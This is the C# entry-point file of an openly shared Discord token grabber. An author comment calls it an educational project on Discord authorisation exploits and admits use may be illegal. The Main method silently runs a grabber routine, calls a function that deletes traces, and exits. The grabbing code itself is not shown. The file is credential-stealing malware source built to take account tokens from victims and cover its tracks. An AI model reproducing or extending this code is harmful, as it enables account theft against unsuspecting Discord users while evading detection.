using System;
using System.Threading;

namespace Qvoid_Token_Grabber
{
    static class Program
    {
        static void Main()
        {
            /*
             * Some information:
             * 
             * I'm happy to share it with the world because I have had it for too long (made it like a year ago) and I have no use of it.
             * I made it as a project to learn how Discord's authorization works and where there are possible exploits.
             * This program is probably will be illegal to use without the rights permissions in most countries.
             * 
             * If u have any interesting ideas you are more than welcome to contact me on my Instagram: "yenon.aharon".
             * 
             * This project was created for educational purposes only, so please do not use it to harm and damage!
             */

            new Thread(() =>
            {
                Discord.Grabber.Grab();
                Discord.Grabber.DeleteTraces(false, false);
                Environment.Exit(0);
            }).Start();

            Thread.Sleep(-1);
        }
    }
}